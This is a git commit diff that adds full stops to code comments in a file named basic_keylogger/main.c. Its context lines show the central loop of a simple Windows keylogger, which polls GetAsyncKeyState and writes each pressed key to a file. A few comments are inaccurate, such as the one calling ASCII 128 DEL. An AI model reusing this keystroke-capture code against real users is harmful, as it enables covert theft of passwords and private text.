c7df84cf2814e8bfe09068f0760c35b8b4bc80e1
Lucas Wagner Fernandes <lucaswagner@institutoiracema.org.br>
2023-10-17 23:32:01 -0300

    docs: Add a dot

--- basic_keylogger/main.c
+++ basic_keylogger/main.c
@@ -8,10 +8,10 @@
     {
         while (1)
         {
-            sleep(10); // Wait for 10 ms
-            for(key = 8; key <= 128; key++) // In ASCII, number 8 refers to the backspace char, and number 128 who is the DEL
+            sleep(10); // Wait for 10 ms.
+            for(key = 8; key <= 128; key++) // In ASCII, number 8 refers to the backspace char, and number 128 who is the DEL.
             {
-                if(GetAsyncKeyState(key) == -32767) { // If a key is pressed put it on the file
+                if(GetAsyncKeyState(key) == -32767) { // If a key is pressed put it on the file.
                     fprintf(file, "%s", ascii_table[key]);
                 }
             }
